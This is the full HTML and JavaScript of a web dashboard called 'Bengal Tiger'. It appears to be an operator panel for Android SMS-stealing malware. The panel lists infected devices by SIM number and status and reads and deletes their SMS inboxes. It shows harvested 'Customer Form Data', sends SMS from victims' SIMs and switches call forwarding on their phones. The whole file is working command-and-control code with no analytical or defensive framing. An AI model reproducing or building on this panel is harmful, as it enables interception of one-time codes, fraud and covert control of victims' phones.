<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bengal Tiger Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; --blue: #1976d2; }
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
        #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
        #toast.show { visibility: visible; opacity: 1; top: 60px; }
        #toast.error { background-color: var(--danger); }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); border-radius: 5px; }
        header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
        .controls i:hover { color: var(--primary); }
        .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
        .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
        .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }
        .filters { text-align: center; margin: 20px; }
        .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
        .filter-btn.active { background: var(--dark); color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
        .card { background: #f8fafc; padding: 20px; border-radius: 32px; box-shadow: 0 8px 32px rgba(25, 118, 210, 0.2); border: 3px solid var(--blue); position: relative; padding-top: 60px; }
        .card.online { border-color: var(--success); box-shadow: 0 8px 32px rgba(40, 167, 69, 0.2); }
        .card.pinned { border-color: var(--primary); }
        .info { font-size: 14px; color: #444; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
        .info b { color: #555; }
        .info i.fa-copy { color: var(--blue); cursor: pointer; margin-left: 8px; font-size: 16px; }
        .btns { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px; }
        .btn-sm { padding: 10px 5px; font-size: 11px; cursor: pointer; border: none; border-radius: 8px; color: white; background: #444; font-weight: bold; transition: 0.2s; }
        .btn-sm:hover { opacity: 0.8; }
        .btn-sms { background: var(--success); }
        .btn-call { background: #ff9800; }
        .btn-view { background: var(--blue); }
        .btn-form { background: #ffeb3b; color: #222; }
        .btn-del { background: var(--danger); }
        .serial-badge { position: absolute; top: 6px; left: 50%; transform: translateX(-50%); background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 15px; border-radius: 50px; font-size: 14px; text-align: center; min-width: 100px; line-height: 1.2; }
        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); }
        .modal.show { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 25px; border-radius: 15px; width: 95%; max-width: 500px; max-height: 85vh; overflow-y: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .modal-header h2 { margin: 0; font-size: 20px; }
        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 5px; font-weight: bold; }
        .no-data { text-align: center; color: #999; padding: 30px; font-style: italic; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 14px; }
        .input-group input, .input-group select, .input-group textarea { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        .sms-item { background: #fff; padding: 12px; margin-bottom: 10px; border-radius: 10px; border-left: 5px solid var(--blue); box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .sms-item .from { color: var(--blue); font-weight: bold; margin-bottom: 5px; display: flex; justify-content: space-between; font-size: 13px; }
        .sms-item .body { font-size: 14px; color: #333; margin-bottom: 8px; line-height: 1.4; word-wrap: break-word; }
        .sms-item .footer { font-size: 11px; color: #888; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #eee; padding-top: 5px; }
        .copy-icon { cursor: pointer; color: var(--blue); transition: 0.2s; font-size: 22px; }
        .copy-icon:hover { transform: scale(1.3); color: var(--success); }
        .del-sms { color: var(--danger); cursor: pointer; padding: 5px; font-size: 16px; }
        .status-badge { display: inline-block; padding: 2px 12px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; margin-top: 5px; border: 1px solid rgba(255,255,255,0.5); }
        .status-online { background: var(--success); }
        .status-offline { background: var(--danger); }
        .data-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        .data-table th, .data-table td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }
        .data-table th { background: #f8fafc; color: #555; font-size: 13px; width: 40%; }
        .data-table td { color: #333; font-size: 14px; }
    </style>
</head>
<body>
    <div id="toast">Success</div>
    <div id="login-screen">
        <h1 style="color:var(--primary); font-size: 2.5rem; letter-spacing: 2px;">BENGAL TIGER</h1>
        <div class="login-box">
            <input type="password" id="pass" placeholder="Enter Admin Password">
            <button class="btn-gold" style="width: 100%;" onclick="login()">LOGIN TO DASHBOARD</button>
        </div>
    </div>

    <div id="dashboard" style="display:none;">
        <header>
            <h2 style="margin:0;"><i class="fas fa-paw"></i> BENGAL TIGER</h2>
            <div class="controls">
                <i class="fas fa-sync-alt" onclick="fetchData(true)" title="Refresh"></i>
                <i class="fas fa-key" onclick="showChangePassModal()" title="Change Password"></i>
                <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
            </div>
        </header>
        <div class="stats">
            <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
            <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
            <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
        </div>
        <div class="filters">
            <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
            <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
            <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
        </div>
        <div class="grid" id="grid"></div>
    </div>

    <!-- Modals -->
    <div id="viewDataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="modalHeaderTitle">📋 Device Details</h2>
                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <div id="viewSmsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📬 SMS Inbox</h2>
                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
            </div>
            <div id="smsModalBody"></div>
        </div>
    </div>

    <div id="actionModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="actionModalTitle">Action</h2>
                <button class="close-btn" onclick="closeModal('actionModal')">✕ Close</button>
            </div>
            <div id="actionModalBody"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let devices = [];
        let currentFilter = 'all';

        function toast(msg, err=false) {
            const t = document.getElementById("toast");
            t.innerText = msg;
            t.className = err ? "show error" : "show";
            setTimeout(() => t.className = "", 3000);
        }

        function copyText(text) {
            if(!text || text === 'N/A') return;
            const tempInput = document.createElement("textarea");
            tempInput.value = text;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand("copy");
            document.body.removeChild(tempInput);
            toast("Copied to clipboard!");
        }

        async function login() {
            const p = document.getElementById('pass').value;
            try {
                const r = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: 'admin', password: p }) });
                const d = await r.json();
                if (d.success) {
                    document.getElementById('login-screen').style.display='none';
                    document.getElementById('dashboard').style.display='block';
                    fetchData(false);
                } else alert('Wrong Password');
            } catch (err) { toast('Login error', true); }
        }

        async function fetchData(showMsg) {
            try {
                const r = await fetch('/api/devices');
                devices = await r.json();
                render();
                if (showMsg) toast('✅ Refreshed!');
            } catch (err) { toast('❌ Refresh failed', true); }
        }

        socket.on('dashboard-update', () => fetchData(false));

        function filter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            render();
        }

        function formatLastSeen(ts) {
            if (!ts) return 'Never';
            const d = new Date(ts);
            if (isNaN(d.getTime())) return 'N/A';
            const diff = Math.floor((Date.now() - d) / 1000);
            if (diff < 60) return diff + 's ago';
            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
            if (diff < 86400) return Math.floor(diff/3600) + 'h ' + Math.floor((diff%3600)/60) + 'm ago';
            return d.toLocaleString();
        }

        function render() {
            document.getElementById('s-all').innerText = devices.length;
            document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
            document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            let list = devices.slice();
            if (currentFilter === 'online') list = list.filter(d=>d.isOnline);
            if (currentFilter === 'pinned') list = list.filter(d=>d.isPinned);
            list.sort((a, b) => new Date(b.registrationTimestamp || 0) - new Date(a.registrationTimestamp || 0));

            list.forEach((d, idx) => {
                const id = d._id || d.deviceId;
                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
                const statusBadge = d.isOnline 
                    ? `<span class="status-badge status-online">ONLINE</span>`
                    : `<span class="status-badge status-offline">OFFLINE</span>`;
                
                const card = document.createElement('div');
                card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                card.innerHTML = `
                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${id}', ${!d.isPinned})"></i></div>
                    <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;">
                        <i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i>
                        <span style="font-weight:bold;">${d.battery||0}%</span>
                    </div>
                    <div class="serial-badge">
                        #${idx + 1}<br><small>${d.model || 'Unknown'}</small>
                        <br>${statusBadge}
                    </div>
                    
                    <div class="info" style="margin-top: 25px;"><b>SIM1:</b> <span>${d.sim1 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim1}')"></i></span></div>
                    <div class="info"><b>SIM2:</b> <span>${d.sim2 || 'N/A'} <i class="fas fa-copy" onclick="copyText('${d.sim2}')"></i></span></div>
                    <div class="info"><b>Last Seen:</b> <span>${formatLastSeen(d.lastSeen)}</span></div>
                    
                    <div class="btns">
                        <button class="btn-sm btn-view" onclick="viewData('${id}')">VIEW DATA</button>
                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${id}')">VIEW SMS</button>
                        <button class="btn-sm btn-form" onclick="viewFormData('${id}')">FORM DATA</button>
                        <button class="btn-sm btn-sms" onclick="showSendSmsModal('${id}')">SEND SMS</button>
                        <button class="btn-sm btn-call" onclick="showCallForwardModal('${id}')">CALL FWD</button>
                        <button class="btn-sm btn-del" onclick="delDevice('${id}')">DELETE</button>
                    </div>`;
                grid.appendChild(card);
            });
        }

        async function viewData(id) {
            document.getElementById('modalHeaderTitle').innerText = '📋 Device Details';
            document.getElementById('modalBody').innerHTML = '<div class="no-data">Fetching...</div>';
            document.getElementById('viewDataModal').classList.add('show');
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'VIEW_DATA' }) });
                const d = await r.json();
                const dev = d.device;
                const statusHtml = dev.isOnline ? '<span style="color:var(--success);font-weight:bold;">ONLINE</span>' : '<span style="color:var(--danger);font-weight:bold;">OFFLINE</span>';
                const installDate = dev.registrationTimestamp ? new Date(dev.registrationTimestamp).toLocaleString() : 'N/A';
                
                document.getElementById('modalBody').innerHTML = `
                    <div style="background:#f1f5f9; padding:10px; border-radius:12px;">
                        <table class="data-table">
                            <tr><th>Model:</th><td>${dev.model || 'N/A'}</td></tr>
                            <tr><th>Serial:</th><td>${dev.serialNumber || 'N/A'}</td></tr>
                            <tr><th>Android Version:</th><td>${dev.androidVersion || 'N/A'}</td></tr>
                            <tr><th>SIM 1:</th><td>${dev.sim1 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;margin-left:5px;" onclick="copyText('${dev.sim1}')"></i></td></tr>
                            <tr><th>SIM 2:</th><td>${dev.sim2 || 'N/A'} <i class="fas fa-copy" style="color:var(--blue);cursor:pointer;margin-left:5px;" onclick="copyText('${dev.sim2}')"></i></td></tr>
                            <tr><th>Install Date:</th><td>${installDate}</td></tr>
                            <tr><th>Last Seen:</th><td>${formatLastSeen(dev.lastSeen)}</td></tr>
                            <tr><th>Status:</th><td>${statusHtml}</td></tr>
                        </table>
                    </div>`;
            } catch(e) { toast('Error', true); }
        }

        async function viewSms(id) {
            document.getElementById('smsModalBody').innerHTML = '<div class="no-data">Fetching...</div>';
            document.getElementById('viewSmsModal').classList.add('show');
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'VIEW_SMS' }) });
                const d = await r.json();
                const msgs = d.messages || [];
                if(msgs.length === 0) {
                    document.getElementById('smsModalBody').innerHTML = '<div class="no-data">Inbox is empty</div>';
                    return;
                }
                document.getElementById('smsModalBody').innerHTML = msgs.map((m, i) => {
                    const safeBody = m.body.replace(/'/g, "\\'").replace(/"/g, '&quot;');
                    return `
                    <div class="sms-item">
                        <div class="from">
                            <span>#${i+1} From: ${m.address || m.from}</span>
                            <i class="fas fa-trash del-sms" onclick="deleteSms('${id}', '${safeBody}', '${m.date}')"></i>
                        </div>
                        <div class="body">${m.body}</div>
                        <div class="footer">
                            <span>${formatLastSeen(m.date || m.time)}</span>
                            <i class="fas fa-copy copy-icon" onclick="copyText('${safeBody}')" title="Copy SMS"></i>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) { toast('Error', true); }
        }

        async function deleteSms(deviceId, body, date) {
            if(!confirm("Are you sure you want to delete this SMS?")) return;
            try {
                const r = await fetch('/api/delete-sms', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, smsData: { body, date } }) });
                const d = await r.json();
                if(d.success) { toast("SMS Deleted Successfully"); viewSms(deviceId); }
            } catch(e) { toast("Failed to delete SMS", true); }
        }

        async function viewFormData(id) {
            document.getElementById('modalHeaderTitle').innerText = '📝 Customer Form Data';
            document.getElementById('modalBody').innerHTML = '<div class="no-data">Fetching...</div>';
            document.getElementById('viewDataModal').classList.add('show');
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'VIEW_FORM' }) });
                const d = await r.json();
                const data = d.customerData || {};
                const entries = Object.entries(data);
                if(entries.length === 0) {
                    document.getElementById('modalBody').innerHTML = '<div class="no-data">No form data submitted</div>';
                    return;
                }
                document.getElementById('modalBody').innerHTML = entries.map(([k, v], i) => {
                    const safeVal = String(v).replace(/'/g, "\\'").replace(/"/g, '&quot;');
                    return `
                    <div style="background:#fffde7; padding:15px; margin-bottom:12px; border-radius:10px; border-left:5px solid #fbc02d; display:flex; justify-content:space-between; align-items:center; box-shadow: 0 2px 5px rgba(0,0,0,0.1);">
                        <div><b>${i+1}. ${k}:</b> ${v}</div>
                        <i class="fas fa-copy copy-icon" style="color:#fbc02d; font-size: 20px;" onclick="copyText('${safeVal}')"></i>
                    </div>`;
                }).join('');
            } catch(e) { toast('Error', true); }
        }

        function showSendSmsModal(id) {
            document.getElementById('actionModalTitle').innerText = 'Send SMS';
            document.getElementById('actionModalBody').innerHTML = `
                <div class="input-group">
                    <label>SELECT SIM SLOT:</label>
                    <select id="smsSim">
                        <option value="1">SIM 1</option>
                        <option value="2">SIM 2</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>RECIPIENT NUMBER:</label>
                    <input type="text" id="smsNum" placeholder="Target mobile number">
                </div>
                <div class="input-group">
                    <label>MESSAGE TEXT:</label>
                    <textarea id="smsMsg" rows="6" placeholder="Type your message here..."></textarea>
                </div>
                <button class="btn-gold" style="width:100%; padding:15px; margin-top: 10px;" onclick="sendSms('${id}')">SEND SMS</button>`;
            document.getElementById('actionModal').classList.add('show');
        }

        async function sendSms(id) {
            const sim = document.getElementById('smsSim').value;
            const number = document.getElementById('smsNum').value;
            const message = document.getElementById('smsMsg').value;
            if(!number || !message) return toast("Please fill all fields", true);
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action: 'SEND_SMS', data: { simSlot: sim, number, message } }) });
                const d = await r.json();
                toast(d.message || (d.success ? "Command Sent" : "Failed"), !d.success);
                if(d.success) closeModal('actionModal');
            } catch(e) { toast("Error sending command", true); }
        }

        function showCallForwardModal(id) {
            document.getElementById('actionModalTitle').innerText = 'Call Forwarding';
            document.getElementById('actionModalBody').innerHTML = `
                <div class="input-group">
                    <label>SELECT SIM SLOT:</label>
                    <select id="cfSim">
                        <option value="1">SIM 1</option>
                        <option value="2">SIM 2</option>
                    </select>
                </div>
                <div class="input-group">
                    <label>ENTER TARGET NUMBER:</label>
                    <input type="text" id="cfNum" placeholder="Enter target number">
                </div>
                <div style="display:flex; gap:10px; margin-top:20px;">
                    <button class="btn-sm btn-sms" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_ACTIVATE')">ACTIVATE</button>
                    <button class="btn-sm btn-del" style="flex:1; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_DEACTIVATE')">DEACTIVATE</button>
                </div>
                <button class="btn-sm btn-view" style="width:100%; margin-top:10px; padding:15px;" onclick="cfAction('${id}', 'CALL_FORWARD_STATUS')">CHECK STATUS</button>`;
            document.getElementById('actionModal').classList.add('show');
        }

        async function cfAction(id, action) {
            const sim = document.getElementById('cfSim').value;
            const number = document.getElementById('cfNum').value;
            if(action === 'CALL_FORWARD_ACTIVATE' && !number) return toast("Enter target number", true);
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, action, data: { simSlot: sim, number } }) });
                const d = await r.json();
                toast(d.message || (d.success ? "Command Sent" : "Failed"), !d.success);
            } catch(e) { toast("Error", true); }
        }

        function delDevice(id) {
            const pass = prompt("Enter ADMIN PASSWORD to confirm deletion:");
            if(!pass) return;
            fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password: pass }) })
                .then(r => r.json())
                .then(d => {
                    if(d.success) { toast("Device and all data erased!"); fetchData(false); }
                    else toast(d.message || "Wrong Password", true);
                });
        }

        function showChangePassModal() {
            document.getElementById('actionModalTitle').innerText = '🔐 Change Password';
            document.getElementById('actionModalBody').innerHTML = `
                <div class="input-group">
                    <label>CURRENT PASSWORD:</label>
                    <input type="password" id="oldP" placeholder="Enter old password">
                </div>
                <div class="input-group">
                    <label>NEW PASSWORD:</label>
                    <input type="password" id="newP" placeholder="Enter new password">
                </div>
                <button class="btn-gold" style="width:100%; padding:15px; margin-top:10px;" onclick="submitChangePass()">UPDATE PASSWORD</button>`;
            document.getElementById('actionModal').classList.add('show');
        }

        async function submitChangePass() {
            const oldPassword = document.getElementById('oldP').value;
            const newPassword = document.getElementById('newP').value;
            if(!oldPassword || !newPassword) return toast("Fill all fields", true);
            try {
                const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword, newPassword }) });
                const d = await r.json();
                if(d.success) { toast("Password Change Successful!"); closeModal('actionModal'); }
                else toast(d.message || "Failed", true);
            } catch(e) { toast("Server error", true); }
        }

        async function togglePin(id, status) {
            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, status }) });
            fetchData(false);
        }

        function closeModal(id) { document.getElementById(id).classList.remove('show'); }
    </script>
</body>
</html>
